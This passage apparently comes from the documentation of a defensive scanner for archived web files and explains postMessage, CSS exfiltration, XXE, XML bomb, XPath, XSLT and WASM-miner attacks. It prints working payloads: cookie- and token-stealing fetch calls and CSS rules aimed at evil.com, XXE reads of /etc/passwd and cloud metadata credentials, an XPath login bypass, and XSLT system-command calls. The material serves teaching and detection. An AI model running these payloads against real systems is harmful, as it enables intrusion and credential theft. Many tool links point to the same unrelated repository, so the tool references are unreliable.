| **CoinBlockerLists** | Maintained blocklist of mining domains | https://github.com/nicehash/coinblockerlist |
| **No Coin** | Browser extension blocking miners | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **MinerBlock** | Another mining blocker with signature DB | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **MineSweeper** (academic) | Research prototype from CCS 2018 paper | Code not publicly released; signatures documented in paper |
| Our scanner | Domain + pattern + algorithm signature matching | Built-in (js_scanner.py) |

> **Status**: Blocklists are public. MineSweeper signatures are documented but the full tool is not released. Our scanner implements the documented detection approach.

### References

- Konoth et al., **"MineSweeper: An In-depth Look into Drive-by Cryptocurrency Mining and Its Defense,"** ACM CCS 2018.
  https://doi.org/10.1145/3243734.3243858

- Hong et al., **"How You Get Shot in the Back: A Systematical Study about Cryptojacking in the Real World,"** ACM CCS 2018.
  https://doi.org/10.1145/3243734.3243840

- Rüth et al., **"Digging into Browser-based Crypto Mining,"** IMC 2018.
  https://doi.org/10.1145/3278532.3278539

- Romano et al., **"MinerRay: Semantics-Aware Analysis for Ever-Evolving Cryptojacking Detection,"** IEEE S&P 2020.
  https://doi.org/10.1109/SP40000.2020.00082

- CoinBlockerLists (maintained blocklist): https://github.com/nicehash/coinblockerlist

---

## 9. postMessage Handler Vulnerabilities

### What is it?

`window.postMessage()` lets web pages communicate across different origins
(domains). A parent page can send messages to an iframe, and vice versa.
The critical rule: the RECEIVER must verify WHO sent the message.

### How does each vulnerability variant work?

```javascript
// ━━━ VULNERABILITY 1: No origin check + dangerous sink ━━━

// A payment widget listens for configuration messages:
window.addEventListener('message', function(event) {
    // NO ORIGIN CHECK — accepts messages from ANY website
    document.getElementById('status').innerHTML = event.data.message;
    //                                 ^^^^^^^^^ DANGEROUS SINK
});

// ATTACK: Attacker creates a page that loads the widget in an iframe:
// attacker.html:
<iframe id="target" src="https://payment-widget.com/checkout"></iframe>
<script>
    let payload = {
        message: '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">'
    };
    document.getElementById('target').contentWindow.postMessage(payload, '*');
    // The payment widget renders the attacker's HTML
    // The script runs in payment-widget.com's origin
    // It has access to the payment page's cookies and DOM
</script>
```

```javascript
// ━━━ VULNERABILITY 2: Weak origin check ━━━

window.addEventListener('message', function(event) {
    // WEAK CHECK — uses indexOf instead of exact match
    if (event.origin.indexOf('trusted.com') > -1) {
        processPayment(event.data);
    }
});

// BYPASS: The attacker hosts their page on:
//   https://evil-trusted.com
//   https://trusted.com.evil.com
//   https://nottrusted.com
// All contain "trusted.com" and pass the indexOf check!

// CORRECT CHECK:
if (event.origin === 'https://trusted.example.com') { ... }
//                 ^^^ exact match, not substring
```

```javascript
// ━━━ VULNERABILITY 3: Wildcard target origin ━━━

// An iframe sends a session token to its parent:
parent.postMessage(sessionToken, '*');
//                               ^^^ ANY parent can receive this!

// ATTACK: If the user is tricked into opening the iframe on evil.com:
// evil.com/page.html:
<iframe src="https://legit-app.com/widget"></iframe>
<script>
    window.addEventListener('message', function(event) {
        // evil.com receives the session token!
        console.log("Stolen token:", event.data);
        fetch('https://evil.com/collect?token=' + event.data);
    });
</script>

// CORRECT:
parent.postMessage(sessionToken, 'https://trusted-parent.com');
//                                ^^^^^ only this origin receives it
```

### What the scanner detects

For each `addEventListener('message', ...)` handler:
1. Is there ANY origin check? → No = HIGH/CRITICAL
2. Is the check strict (`===`) or weak (`indexOf`)? → Weak = MEDIUM
3. Does event.data flow into a dangerous sink? → Yes escalates to CRITICAL
4. For `postMessage()` calls: is targetOrigin `'*'`? → Yes = MEDIUM

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **PMForce** | Automated postMessage handler analysis (research) | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **postMessage-tracker** | Chrome extension to monitor postMessage | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **Burp DOM Invader** | Detects postMessage sinks dynamically (commercial) | https://portswigger.net/burp/documentation/desktop/tools/dom-invader |
| Our scanner | Static origin-check analysis in archived JS | Built-in (js_scanner.py) |

> **Status**: PMForce (Steffens et al., CCS 2020) is the closest research tool: https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io. Our scanner does lighter-weight static analysis suitable for archive-scale scanning.

### References

- Son & Shmatikov, **"The Postman Always Rings Twice: Attacking and Defending postMessage,"** NDSS 2013.
  https://doi.org/10.14722/ndss.2013.23201

- Stock et al., **"How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security,"** USENIX Security 2017.
  https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/stock

- Steffens et al., **"PMForce: Systematically Analyzing postMessage Handlers at Scale,"** ACM CCS 2020.
  https://doi.org/10.1145/3372297.3417267

- OWASP, **"Testing for Web Messaging (HTML5 postMessage)."**
  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/11-Testing_Web_Messaging

---

## 10. CSS Attribute Selector Exfiltration

### What is it?

CSS can select HTML elements based on their attribute values. By combining
attribute selectors with `url()` properties (like `background-image`), an
attacker can leak data from the page — one character at a time — using only
CSS, with no JavaScript required.

### How does it work, step by step?

```
THE PAGE has a hidden CSRF token:
┌──────────────────────────────────────────┐
│  <form>                                  │
│    <input type="hidden"                  │
│           name="csrf_token"              │
│           value="a8f3b2c1d9e7">          │
│    <button>Submit</button>               │
│  </form>                                 │
└──────────────────────────────────────────┘
```

```css
/* STEP 1: Attacker injects CSS that probes the first character */
input[name=csrf_token][value^=a] { background: url(https://evil.com/leak?c=a); }
input[name=csrf_token][value^=b] { background: url(https://evil.com/leak?c=b); }
input[name=csrf_token][value^=c] { background: url(https://evil.com/leak?c=c); }
/* ... one rule per possible character (a-z, 0-9 = 36 rules) */

/* WHAT HAPPENS:
   The browser evaluates ALL selectors.
   [value^=a] means "value STARTS WITH a"
   The token starts with "a", so the first rule matches.
   The browser loads: https://evil.com/leak?c=a
   Attacker's server receives: first character is "a" */
```

```css
/* STEP 2: Attacker generates new CSS for the second character */
input[name=csrf_token][value^=a8] { background: url(https://evil.com/leak?c=a8); }
input[name=csrf_token][value^=a9] { background: url(https://evil.com/leak?c=a9); }
input[name=csrf_token][value^=aa] { background: url(https://evil.com/leak?c=aa); }
/* ... 36 more rules */

/* Match: [value^=a8] → evil.com receives "a8" */
/* Now attacker knows first two characters: "a8" */
```

```
/* STEP 3-12: Repeat until entire token is extracted */

ATTACKER'S SERVER LOG:
  GET /leak?c=a       ← 1st character
  GET /leak?c=a8      ← 2nd character
  GET /leak?c=a8f     ← 3rd character
  GET /leak?c=a8f3    ← 4th character
  ...
  GET /leak?c=a8f3b2c1d9e7  ← complete token!

The attacker now has the CSRF token and can forge requests.
```

### Why this bypasses CSP

Content Security Policy (CSP) can block all JavaScript:
```
Content-Security-Policy: script-src 'none'
```
But if styles are allowed (which most sites need), CSS exfiltration works:
```
Content-Security-Policy: script-src 'none'; style-src 'self' 'unsafe-inline'
```
JavaScript is blocked. CSS still works. Data still leaks.

### What the scanner detects

- `[value^=X]`, `[value$=X]`, `[value*=X]` selectors combined with `url()`
- Selectors targeting `name=csrf`, `name=token`, or similar sensitive names
- Bulk detection: 5+ value-prefix selectors in one file = systematic exfil

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **CSS Exfil Protection** (browser ext) | Blocks CSS exfiltration in the browser | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **cssExfiltrator** | Offensive PoC for CSS data theft | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **PortSwigger CSS exfiltrator** | Full PoC with server component | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| Our scanner | Defensive: detects exfil patterns in archived CSS | Built-in (css_scanner.py) |

> **Status**: Only offensive PoCs exist publicly. No defensive CSS scanner for archives existed before ours. Our scanner is novel.

### References

- Heyes, **"Blind CSS Exfiltration: Exfiltrate Unknown Web Pages,"** PortSwigger Research 2024.
  https://portswigger.net/research/blind-css-exfiltration

- Heyes, **"Inline Style Exfiltration: Leaking Data with Chained CSS Conditionals,"** PortSwigger Research 2025.
  https://portswigger.net/research/inline-style-exfiltration

- Vila, **"CSS Exfil Protection,"** 2018.
  https://github.com/AcidWar/css-exfil-protection

- Gualtieri, **"Stealing Data With CSS: Attack and Defense,"** 2018.
  https://github.com/AcidWar/css-exfil-protection

- OWASP, **"Testing for CSS Injection."**
  https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection

---

## 11. CSS @import Chain Exfiltration

### What is it?

An advanced version of CSS exfiltration that works from a SINGLE injection
point — no page reloads, no iframes. It chains `@import` rules so each
import blocks until the previous character is leaked.

### How does it work?

```
ATTACKER injects: <style>@import 'https://evil.com/start'</style>

TIMELINE:
═══════════════════════════════════════════════════════════════

  t=0ms    Browser requests: GET evil.com/start
           ↓
  t=5ms    Server returns CSS with 36 @import rules:
           @import 'evil.com/probe?pos=0&guess=a';  ← BLOCKS
           @import 'evil.com/probe?pos=0&guess=b';  ← BLOCKS
           ...
           @import 'evil.com/probe?pos=0&guess=8';  ← RETURNS!
           (server knows first char is '8' from CSS selector match)

  t=50ms   The unblocked import returns MORE @imports:
           @import 'evil.com/probe?pos=1&prefix=8&guess=a';
           @import 'evil.com/probe?pos=1&prefix=8&guess=b';
           ...

  t=100ms  Second character found: 'f'

  t=150ms  Third character found: '3'

  t=2500ms COMPLETE TOKEN EXFILTRATED: "8f3b2c1d9e7a"

═══════════════════════════════════════════════════════════════
Total time: ~2.5 seconds over HTTP/2
```

The key insight: over HTTP/2, all imports are multiplexed on one connection.
The server holds responses open (blocking) until it confirms which character
matched, then releases the next round of probes.

### What the scanner detects

- `@import` rules pointing to external domains
- Multiple imports to the SAME external domain (chaining pattern)
- Unusually high number of external imports (5+)

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **css-exfiltrator-server** | Heyes' PoC server for @import chaining | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **Securitum PoC** | Firefox-specific @import exfil PoC | Referenced in blog post (no standalone repo) |
| Our scanner | Detects @import chains pointing to external domains | Built-in (css_scanner.py) |

> **Status**: Only offensive PoCs. No defensive scanner. Our scanner is novel.

### References

- Securitum, **"CSS data exfiltration in Firefox via a single injection point,"** 2020.
  https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/

- Vila, **"Exfiltration via CSS Injection,"** 2018.
  https://vwzq.net/slides/2019-s3_css_injection_so_hot_right_now.pdf

- Heyes, **"Blind CSS Exfiltration,"** PortSwigger Research 2024.
  https://portswigger.net/research/blind-css-exfiltration

- x-c3ll, **"CSS Injection Primitives,"** 2019.
  https://x-c3ll.github.io/posts/CSS-Injection-Primitives/

---

## 12. CSS Font Ligature Keylogging

### What is it?

This attack uses custom fonts to leak TEXT CONTENT (not just attribute
values like Test 10). The attacker defines `@font-face` rules where each
individual character maps to a font file hosted on their server. When the
browser renders text using this font, it fetches the font for each character
that appears, leaking the content.

### How does it work?

```css
/* STEP 1: Define a font for each character */
@font-face {
    font-family: "leak";
    src: url(https://evil.com/log?char=A);
    unicode-range: U+0041;  /* Only for character 'A' */
}
@font-face {
    font-family: "leak";
    src: url(https://evil.com/log?char=B);
    unicode-range: U+0042;  /* Only for character 'B' */
}
/* ... one @font-face per character A-Z, a-z, 0-9 */

/* STEP 2: Apply to the target element */
#api-key-display {
    font-family: "leak" !important;
}
```

```
THE PAGE shows:
┌─────────────────────────────────┐
│  Your API Key: SK_8fB3xQ9       │
│  ^^^^^^^^^^^^^^^^^^^^           │
│  #api-key-display element       │
└─────────────────────────────────┘

BROWSER BEHAVIOR:
  Text to render: "SK_8fB3xQ9"
  Characters present: S, K, _, 8, f, B, 3, x, Q, 9

  Browser loads fonts:
    GET evil.com/log?char=S  ← character S is in the text
    GET evil.com/log?char=K  ← character K is in the text
    GET evil.com/log?char=8  ← character 8 is in the text
    GET evil.com/log?char=f  ← character f is in the text
    GET evil.com/log?char=B  ← character B is in the text
    GET evil.com/log?char=3  ← character 3 is in the text
    GET evil.com/log?char=x  ← character x is in the text
    GET evil.com/log?char=Q  ← character Q is in the text
    GET evil.com/log?char=9  ← character 9 is in the text

  Attacker knows: characters {S,K,8,f,B,3,x,Q,9} appear in the key
  (Order needs additional techniques to determine, but character SET is leaked)
```

### What the scanner detects

- `@font-face` with narrow `unicode-range` (single codepoint like U+0041)
  combined with external `src: url(https://...)`
- 5+ such blocks = CRITICAL (systematic keylogging pattern)
- Blocks with broad ranges (U+0000-00FF) and local URLs are ignored as normal

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **css-keylogging** | PoC demonstrating font-based keylogging | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **Gualtieri's CSS Exfil PoC** | Original proof of concept | https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense |
| Our scanner | Detects suspicious @font-face + unicode-range combos | Built-in (css_scanner.py) |

> **Status**: Only offensive PoCs. No defensive scanner. Our scanner is novel.

### References

- Gualtieri, **"Stealing Data With CSS: Attack and Defense,"** 2018.
  https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense

- Huang et al., **"CSS-based attack: abusing unicode-range of @font-face,"** HackerOne reports, various 2018-2020.
  https://hackerone.com/reports/148853

- PortSwigger, **"The State of CSS Injection — Leaking Text Nodes & HTML Attributes,"** HackerNotes Ep.79, 2025.
  https://blog.criticalthinkingpodcast.io/p/css-injection-leaking-text-nodes-html-attributes

- Aszx87410, **"Beyond XSS: CSS Injection,"** 2022.
  https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/

---

## 13. XXE

### What is it?

XML External Entity (XXE) injection abuses XML parsers that process external
entity references. Entities are like variables in XML — you define them in the
DOCTYPE and reference them in the document. "External" entities load their
value from a file or URL.

### How does it work?

```xml
<!-- ━━━ ATTACK 1: Reading local files ━━━ -->
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>

<!-- The parser resolves &xxe; by reading /etc/passwd -->
<!-- Server response includes: -->
<user>
    <name>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</name>
</user>
```

```xml
<!-- ━━━ ATTACK 2: SSRF — reaching internal services ━━━ -->
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<query>&ssrf;</query>

<!-- On AWS, 169.254.169.254 is the metadata service -->
<!-- The XML parser, running INSIDE the server's network, fetches: -->
<!-- IAM role credentials with full AWS access -->
```

```xml
<!-- ━━━ ATTACK 3: Out-of-Band exfiltration (blind XXE) ━━━ -->
<!-- When the app doesn't return parsed XML content -->

<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY exfil SYSTEM 'https://evil.com/steal?data=%file;'>">
    %eval;
]>
<data>&exfil;</data>

<!-- Step 1: %file loads /etc/hostname → "webserver-prod-01" -->
<!-- Step 2: %eval constructs a new entity with the data in the URL -->
<!-- Step 3: &exfil; triggers a request to: -->
<!--   https://evil.com/steal?data=webserver-prod-01 -->
<!-- Attacker receives the data even though the response is blind -->
```

### What the scanner detects

- `<!DOCTYPE` declarations with `<!ENTITY` definitions
- `SYSTEM` keyword (file://, http://, etc.)
- `PUBLIC` keyword (alternative external entity syntax)
- Parameter entities (`%entity;`) — used for blind/OOB XXE
- Custom entity references in document body

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **xxeinjector** | Automated XXE exploitation tool | https://github.com/enjoiz/XXEinjector |
| **xxeftp** | OOB XXE exfiltration via FTP | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **Semgrep XXE rules** | Static detection of XXE patterns | https://semgrep.dev/r?q=xxe |
| **OWASP ZAP** | Active XXE scanner for live sites | https://www.zaproxy.org/ |
| Our scanner | Static detection of DTD/ENTITY patterns in archived XML | Built-in (xml_scanner.py) |

> **Status**: Yes, public tools exist for live testing. Semgrep has rules for source code. Our scanner adapts this for archived XML responses.

### References

- Morgan, **"XML Schema, DTD, and Entity Attacks: A Compendium of Known Techniques,"** 2014.
  https://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf

- OWASP, **"XML External Entity (XXE) Processing."**
  https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

- OWASP, **"XXE Prevention Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

- Steuck, **"XXE (XML eXternal Entity) Attack,"** 2002 (original disclosure).
  https://www.securityfocus.com/archive/1/297714

- PortSwigger, **"XML External Entity (XXE) Injection,"** Web Security Academy.
  https://portswigger.net/web-security/xxe

---

## 14. XML Bomb

### What is it?

An XML bomb (Billion Laughs) uses nested entity definitions that expand
exponentially, consuming gigabytes of memory from a kilobyte-sized input.

### How does it work?

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<data>&lol9;</data>
```

```
EXPANSION MATH:
  lol  = "lol"                              = 3 bytes
  lol2 = 10 × lol                           = 30 bytes
  lol3 = 10 × lol2                          = 300 bytes
  lol4 = 10 × lol3                          = 3,000 bytes (3 KB)
  lol5 = 10 × lol4                          = 30,000 bytes (30 KB)
  lol6 = 10 × lol5                          = 300,000 bytes (300 KB)
  lol7 = 10 × lol6                          = 3,000,000 bytes (3 MB)
  lol8 = 10 × lol7                          = 30,000,000 bytes (30 MB)
  lol9 = 10 × lol8                          = 300,000,000 bytes (300 MB)

  INPUT SIZE:  ~1 KB
  OUTPUT SIZE: ~300 MB (or 3 GB with one more level)

  The parser tries to expand everything in memory → OUT OF MEMORY → CRASH
```

### What the scanner detects

- Entities that reference other entities (recursive definitions)
- Entity nesting depth ≥ 3 levels
- High entity count (5+ definitions in DOCTYPE)

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **defusedxml** (Python) | Safe XML parsing library that blocks bombs | https://github.com/tiran/defusedxml |
| **libxml2** | Has built-in entity expansion limits | https://gitlab.gnome.org/GNOME/libxml2 |
| Our scanner | Detects recursive entity definitions in archived XML | Built-in (xml_scanner.py) |

> **Status**: Defensive libraries exist (defusedxml). No dedicated scanner for detecting bombs in archived files. Our scanner is novel.

### References

- Sullivan, **"XML Denial of Service Attacks and Defenses,"** MSDN Magazine, November 2009.
  https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses

- OWASP, **"XML Security Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html

- CVE-2003-1564 — Original Billion Laughs XML bomb advisory.
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1564

- Wikipedia, **"Billion laughs attack."**
  https://en.wikipedia.org/wiki/Billion_laughs_attack

---

## 15. XPath Injection

### What is it?

XPath is like SQL but for XML documents. If an app builds XPath queries
using unsanitized input, an attacker can manipulate the query logic.

### How does it work?

```xml
<!-- THE XML "DATABASE" on the server -->
<users>
    <user>
        <name>alice</name>
        <password>secret123</password>
        <role>user</role>
    </user>
    <user>
        <name>admin</name>
        <password>sup3rS3cur3!</password>
        <role>admin</role>
    </user>
</users>
```

```python
# THE VULNERABLE SERVER CODE (Python example)
def authenticate(username, password):
    query = f"//user[name='{username}' and password='{password}']"
    result = xml_tree.xpath(query)
    return len(result) > 0
```

```
NORMAL LOGIN:
  Input:  username = "alice", password = "secret123"
  Query:  //user[name='alice' and password='secret123']
  Result: Finds alice's node → authentication SUCCESS ✓

ATTACK — Authentication bypass:
  Input:  username = "admin' or '1'='1"
          password = "anything' or '1'='1"
  Query:  //user[name='admin' or '1'='1' and password='anything' or '1'='1']
  Logic:  '1'='1' is always TRUE
  Result: Returns ALL user nodes → authentication SUCCESS as admin ✗

ATTACK — Extract all usernames:
  Input:  username = "' or 1=1 or ''='"
  Query:  //user[name='' or 1=1 or ''='']
  Result: Returns every user node
```

### What the scanner detects

In XSLT and XML files:
- XPath `select=""` expressions containing variables (`$paramName`)
- `concat()` in XPath (dynamic query construction)
- XPath predicates with variable comparisons

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **xpathblind** | Blind XPath injection exploitation tool | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **Burp Suite** | Can detect XPath injection in live traffic | https://portswigger.net/burp |
| **OWASP ZAP** | Active XPath injection scanner | https://www.zaproxy.org/ |
| Our scanner | Detects injectable XPath patterns in archived XSLT/XML | Built-in (xml_scanner.py) |

> **Status**: Active exploitation tools exist. No static scanner for archived XSLT files. Our scanner is novel.

### References

- Amit Klein, **"Blind XPath Injection,"** Watchfire, 2005.
  https://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf

- OWASP, **"XPATH Injection."**
  https://owasp.org/www-community/attacks/XPATH_Injection

- OWASP, **"Testing for XPath Injection."**
  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection

- Dawes, **"XPath Injection in XML Databases,"** University of London, 2008.

---

## 16. XSLT Injection

### What is it?

XSLT is a transformation language for XML. It's surprisingly powerful — in
some processors, XSLT can read files, execute system commands, and make
network requests.

### How does it work?

```xml
<!-- ━━━ ATTACK 1: File read via document() ━━━ -->
<xsl:value-of select="document('file:///etc/passwd')"/>
<!-- The XSLT processor reads /etc/passwd and outputs its contents -->
```

```xml
<!-- ━━━ ATTACK 2: Remote code execution in PHP ━━━ -->
<xsl:value-of select="php:function('system', 'whoami')"/>
<!-- PHP's XSLT extension can call ANY PHP function -->
<!-- Output: www-data -->

<xsl:value-of select="php:function('file_get_contents', '/etc/shadow')"/>
<!-- Reads the shadow password file -->
```

```xml
<!-- ━━━ ATTACK 3: SSRF via user-controlled parameter ━━━ -->
<xsl:param name="url"/>  <!-- User provides this -->
<xsl:value-of select="document($url)"/>
<!-- If $url = "http://internal-server:8080/admin" -->
<!-- The XSLT processor fetches the internal admin page -->
```

```xml
<!-- ━━━ ATTACK 4: XSS via disable-output-escaping ━━━ -->
<xsl:value-of select="user-input" disable-output-escaping="yes"/>
<!-- If user-input contains <script>alert(1)</script> -->
<!-- It's output RAW without escaping → XSS -->
```

```xml
<!-- ━━━ ATTACK 5: Microsoft XSLT script execution ━━━ -->
<msxsl:script language="JScript">
    function exploit() {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("calc.exe");
        return "pwned";
    }
</msxsl:script>
<xsl:value-of select="user:exploit()"/>
<!-- Executes calc.exe on the server (or any command) -->
```

### What the scanner detects

- `document()` with file:// or http:// URLs (file read / SSRF)
- `document()` with variables (user-controlled SSRF)
- `php:function()`, `saxon:evaluate()`, `dyn:evaluate()`
- `<msxsl:script>` or `<xsl:script>` elements
- `disable-output-escaping="yes"` (XSS)
- `system-property()` (information disclosure)
- `<xsl:result-document>` (arbitrary file write)

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **xsltproc** | Standard XSLT processor (can test payloads) | https://xmlsoft.org/XSLT/ |
| **Saxon** | Java XSLT processor (evaluates extensions) | https://www.saxonica.com/products/products.xml |
| Our scanner | Flags dangerous XSLT functions in archived stylesheets | Built-in (xml_scanner.py) |

> **Status**: No public static scanner for XSLT injection patterns. Exploitation is mostly manual. Our scanner is novel.

### References

- Braga, **"XSLT Server Side Injection Attacks,"** Context Information Security, 2015.
  https://www.contextis.com/en/blog/xslt-server-side-injection-attacks

- OWASP, **"XSLT Injection."**
  https://owasp.org/www-community/attacks/XSLT_Injection

- IOActive, **"Abusing XSLT for Practical Attacks,"** 2015.
  https://www.ioactive.com/pdfs/abusing_xslt_for_practical_attacks.pdf

- Acunetix, **"XSLT Injection Explained."**
  https://www.acunetix.com/vulnerabilities/web/xslt-injection/

---

## 17. WASM Cryptominer Detection

### What is it?

WebAssembly made browser-based mining practical because WASM runs 10-20x
faster than JavaScript for the hash computations miners need.

### How does it work?

```javascript
// ━━━ HOW A WASM MINER LOADS ━━━

// Step 1: Small JavaScript loader
const importObject = {
    env: {
        memory: new WebAssembly.Memory({ initial: 256 }),
        // Callback for communicating hash results
        submit_hash: function(nonce, hash_ptr) {
            // Send result to mining pool via WebSocket
            ws.send(JSON.stringify({
                type: 'submit',
                nonce: nonce,
                result: readHashFromMemory(hash_ptr)
            }));
        }
    }
};

// Step 2: Load the WASM mining module
WebAssembly.instantiateStreaming(fetch('miner.wasm'), importObject)
    .then(result => {
        const exports = result.instance.exports;

        // Step 3: Receive jobs from mining pool
        ws.onmessage = function(event) {
            let job = JSON.parse(event.data);
            // Step 4: Run CryptoNight hash in WASM (fast!)
            exports.cn_slow_hash(
                job.blob_ptr,    // Input data
                job.blob_len,    // Input length
                job.result_ptr,  // Where to write hash
                job.variant      // Algorithm variant
            );
        };
    });
```

```
WHY WASM?
═════════════════════════════════════════════
CryptoNight hash performance:
  JavaScript:  ~10 hashes/second
  WebAssembly: ~80 hashes/second (8x faster)
  Native C:    ~90 hashes/second

WASM is nearly as fast as native code!
At 80 H/s per visitor × 10,000 visitors = 800,000 H/s
That's enough to earn ~$50-100/day in Monero
═════════════════════════════════════════════
```

### What the scanner detects

The scanner examines WASM binary files:
1. **Byte signatures**: Searches for strings like "cryptonight", "CoinHive",
   "scratchpad", "cn_slow_hash" embedded in the binary
2. **Export names**: Looks for function names related to mining
   (hash, mine, nonce, etc.)
3. **Known file hashes**: Compares against SHA256 hashes of known miner modules
4. **Size heuristic**: Miners are typically 100KB-2MB due to hash algorithm code

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **wabt** (WebAssembly Binary Toolkit) | Disassemble, inspect WASM binaries | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| **wasm-decompile** | Decompile WASM to readable pseudocode | Part of wabt toolkit |
| **MinerRay** (academic) | Semantic cryptojacking detector | Signatures in paper; code not fully released |
| **MINOS** (academic) | Real-time cryptojacking detection | https://doi.org/10.14722/ndss.2021.24444 (paper only) |
| Our scanner | Binary signature + export name + size heuristic scanning | Built-in (wasm_scanner.py) |

> **Status**: wabt is public for binary inspection. Academic detection tools (MinerRay, MINOS) document their approaches but don't release full code. Our scanner implements the documented signature-matching approach.

### References

- Konoth et al., **"MineSweeper: An In-depth Look into Drive-by Cryptocurrency Mining and Its Defense,"** ACM CCS 2018.
  https://doi.org/10.1145/3243734.3243858

- Romano et al., **"MinerRay: Semantics-Aware Analysis for Ever-Evolving Cryptojacking Detection,"** IEEE S&P 2020.
  https://doi.org/10.1109/SP40000.2020.00082

- Lehmann et al., **"Everything Old is New Again: Binary Security of WebAssembly,"** USENIX Security 2020.
  https://www.usenix.org/conference/usenixsecurity20/presentation/lehmann

- NCC Group, **"Security Chasms of WASM,"** BlackHat USA 2018.
  https://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf

- Cabrera Arteaga et al., **"WebAssembly and Security: A Review,"** arXiv 2024.
  https://arxiv.org/abs/2407.12297

- Naseem et al., **"MINOS: A Lightweight Real-Time Cryptojacking Detection System,"** NDSS 2021.
  https://doi.org/10.14722/ndss.2021.24444

- WebAssembly Security Documentation.
  https://webassembly.org/docs/security/

---

## 18. Missing Subresource Integrity (SRI)

### What is it?

When a website loads JavaScript or CSS from an external CDN (like `cdn.jsdelivr.net`
or `cdnjs.cloudflare.com`), it trusts that CDN to serve the correct file. But if the
CDN is compromised, the attacker can replace `jquery.min.js` with a malicious version
that steals credentials, injects cryptominers, or redirects users. SRI prevents this
by letting the page specify a cryptographic hash of the expected file content — the
browser refuses to execute it if the hash doesn't match.

### How does the attack work?

```html
<!-- ━━━ VULNERABLE: No integrity hash ━━━ -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>

<!-- If the CDN is compromised, attacker replaces jquery with: -->
<!-- (function(){ fetch('https://evil.com/steal?c='+document.cookie); })(); -->
<!-- + the original jQuery code appended so nothing looks broken -->
<!-- Every visitor to every site using this CDN gets pwned -->
```

```html
<!-- ━━━ SAFE: With SRI integrity hash ━━━ -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
        crossorigin="anonymous"></script>

<!-- If the CDN file is tampered with, the hash won't match -->
